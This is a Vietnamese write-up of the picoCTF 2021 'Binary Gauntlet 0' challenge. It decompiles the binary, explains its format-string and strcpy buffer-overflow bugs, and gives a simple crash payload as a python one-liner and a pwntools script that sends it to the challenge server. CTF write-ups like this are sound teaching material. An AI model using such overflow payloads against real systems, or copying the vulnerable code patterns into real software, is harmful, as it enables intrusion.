# Binary Gauntlet 0 - picoCTF 2021

## Thông tin bài

- Category: Binary Exploitation
- Binary: `gauntlet`
- Remote:

```bash
nc wily-courier.picoctf.net 51753
```

Đề bài nói flag không có format `picoCTF{...}` như bình thường.

---

## Phân tích ban đầu

Chạy thử local:

```bash
./gauntlet
```

Kết quả:

```text
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
```

Điều này nghĩa là chương trình cần file `flag.txt`. Local không có flag thật nên báo lỗi.
Ta có thể tạo flag giả để debug:

```bash
echo "FAKE_FLAG" > flag.txt
./gauntlet
```

---

## Kiểm tra binary

Dùng `file`:

```bash
file gauntlet
```

Binary là ELF 64-bit.

Kiểm tra protection:

```bash
checksec --file=gauntlet
```

Các protection quan trọng của bài này:

```text
No Canary
NX disabled
No PIE
```

Tuy nhiên bài này không cần shellcode hay ret2win. Chỉ cần làm chương trình crash là đủ.

---

## Dịch ngược chương trình

Dùng IDA để xem pseudocode. Logic chính của chương trình gần giống như sau:

```c
char flag[64];

void sigsegv_handler(int sig) {
    fprintf(stderr, flag);
    fflush(stderr);
    exit(1);
}

int main(int argc, char **argv) {
    char local_buf[128];
    char *heap_buf;
    FILE *f;
    gid_t gid;

    heap_buf = malloc(1000);

    f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
        exit(0);
    }

    fgets(flag, 64, f);

    signal(SIGSEGV, sigsegv_handler);

    gid = getegid();
    setresgid(gid, gid, gid);

    fgets(heap_buf, 1000, stdin);
    heap_buf[999] = '\0';

    printf(heap_buf);
    fflush(stdout);

    fgets(heap_buf, 1000, stdin);
    heap_buf[999] = '\0';

    strcpy(local_buf, heap_buf);

    return 0;
}
```

---

## Lỗ hổng

Chương trình có 2 lỗi chính.

### 1. Format string

Đoạn này nguy hiểm:

```c
printf(heap_buf);
```

Vì `heap_buf` là input của người dùng. Đúng ra phải viết:

```c
printf("%s", heap_buf);
```

Nhưng trong bài này không cần khai thác lỗi format string.

---

### 2. Buffer overflow

Đoạn quan trọng nhất:

```c
char local_buf[128];
strcpy(local_buf, heap_buf);
```

`heap_buf` được cấp phát 1000 byte và người dùng có thể nhập gần 1000 byte:

```c
fgets(heap_buf, 1000, stdin);
```

Nhưng sau đó chương trình copy vào `local_buf`, chỉ có 128 byte:

```c
strcpy(local_buf, heap_buf);
```

Vậy nếu nhập dài hơn 128 byte, chương trình sẽ bị tràn buffer trên stack.

Stack layout đơn giản:

```text
local_buf[128]
saved RBP
return address
```

Offset tới return address:

```text
128 + 8 = 136 bytes
```

Nếu nhập hơn 136 byte, ta có thể ghi đè return address.

---

## Điểm đặc biệt của bài

Chương trình có cài signal handler cho lỗi segmentation fault:

```c
signal(SIGSEGV, sigsegv_handler);
```

Khi chương trình bị crash do SIGSEGV, hàm này sẽ chạy:

```c
void sigsegv_handler(int sig) {
    fprintf(stderr, flag);
    fflush(stderr);
    exit(1);
}
```

Hàm này in thẳng biến `flag`.

Vì vậy mục tiêu của ta rất đơn giản:

```text
Làm chương trình crash
-> SIGSEGV handler được gọi
-> chương trình in flag
```

Không cần gọi hàm win, không cần shellcode, không cần leak địa chỉ.

---

## Khai thác local

Tạo flag giả:

```bash
echo "FAKE_FLAG" > flag.txt
```

Payload đơn giản:

```bash
python3 -c 'print("hello"); print("A"*200)' | ./gauntlet
```

Giải thích:

- Dòng 1 `hello` đi vào lần nhập đầu tiên:

```c
fgets(heap_buf, 1000, stdin);
printf(heap_buf);
```

- Dòng 2 `A * 200` đi vào lần nhập thứ hai:

```c
fgets(heap_buf, 1000, stdin);
strcpy(local_buf, heap_buf);
```

Vì 200 byte lớn hơn 136 byte nên return address bị ghi đè. Khi chương trình `ret`, nó nhảy tới địa chỉ rác `0x4141414141414141`, gây SIGSEGV. Signal handler chạy và in flag.

---

## Exploit remote

File `solve.py`:

```python
from pwn import *

HOST = "wily-courier.picoctf.net"
PORT = 51753

p = remote(HOST, PORT)

# Input lần 1: đi vào printf(heap_buf)
p.sendline(b"hello")

# Input lần 2: overflow local_buf, làm chương trình crash
p.sendline(b"A" * 200)

p.interactive()
```

Chạy:

```bash
python3 solve.py
```

Sau khi chương trình crash, handler sẽ in flag thật từ server.

---

## Có thể khai thác thủ công bằng nc

```bash
nc wily-courier.picoctf.net 51753
```

Nhập dòng đầu:

```text
hello
```

Nhập dòng thứ hai đủ dài:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Khi chương trình crash, flag sẽ được in ra.

---

## Kết luận

Bài này không cần khai thác phức tạp. Chương trình đọc flag vào biến global, sau đó cài `SIGSEGV handler`. Handler này lại in flag khi chương trình bị crash.

Lỗi chính nằm ở đoạn:

```c
strcpy(local_buf, heap_buf);
```

Do `heap_buf` có thể dài gần 1000 byte, còn `local_buf` chỉ có 128 byte, ta có thể gây buffer overflow và làm chương trình crash.

Ý tưởng khai thác:

```text
Gửi input đầu bất kỳ
-> gửi input thứ hai dài hơn 136 byte
-> ghi đè return address
-> chương trình crash
-> sigsegv_handler in flag
```

Payload cuối:

```python
p.sendline(b"hello")
p.sendline(b"A" * 200)
```
